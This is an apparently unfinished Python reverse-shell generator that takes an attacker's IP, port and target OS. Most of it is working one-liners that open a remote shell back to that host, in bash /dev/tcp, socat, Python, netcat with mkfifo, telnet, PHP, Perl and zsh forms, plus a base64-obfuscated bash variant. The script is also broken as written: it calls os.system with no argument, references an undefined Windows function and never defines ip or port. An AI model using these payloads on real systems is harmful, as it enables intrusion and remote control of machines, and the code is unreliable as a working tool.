#!/usr/bin/env python3
import base64
import requests
import os
import argparse

def main():
	parser = argparse.ArgumentParser()
	global args
	parser.add_argument('-H','--host' ,help='LOCAL IP ADDRESS',required=True)
	parser.add_argument('-p','--port' ,help='LOCAL PORT NUMBER',type=int,required=True)
	parser.add_argument("-t","--type",help='Payload Type [windows/linux]',type=str,required=True)
	parser.add_argument("-u","--url",help='Target url [http://localhost:8888/h.php?meow=PWN] #OPTIONAL')
	#parser.add_argument("-c","--cookie",help='Provide a Cookie')
	#parser.add_argument("-l","--header",help='Provide a header')
	#parser.add_argument("-m","--method",help='Request Method')
	#parser.add_argument("-d","--data",help='Post data')
	args = parser.parse_args()

	if args.type == "linux" or args.type == "l":
		shell_linux()
	elif args.type == "windows" or args.type == "w":
		shell_windows()
	else:
		print("[!]Invalid Value -> "+args.type)



def shell_linux():
	print ("")
	os.system()


#////////////////////////SHELLS////////////////////////////////////#
def bash():
	bash196=f'''0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'''
	bash_dev=f'''/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"'''
	bash_readline=f'''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'''
	bash5=f'''sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'''

def socat():
	socat=f'''socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane'''

def python():
	python2=f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
	python3=f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''

def openBSD():
	BSD=f'''mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'''

def telnet():
	telnet=f'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF'''

def php():
	exec1=f'''php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\''''
	shell_exec=f'''php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\''''
	system=f'''php -r '$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\''''
	weird_qoute=f'''php -r '$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\''''
	#add pentestmonkey
	
def perl():
	perl=f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'''+'{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\''
	perl_no_sh=f'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''''

def zsh():
	zsh=f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''

def obfuscated():
	#bash
	cli=f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'".encode("utf-8")
	encoded = base64.b64encode(cli).decode('utf-8')
	cli2="bash -c '{echo,"+f"{encoded}"+"}|{base64,-d}|{bash,-i}'"
	


if __name__ == '__main__':
		exit(main())
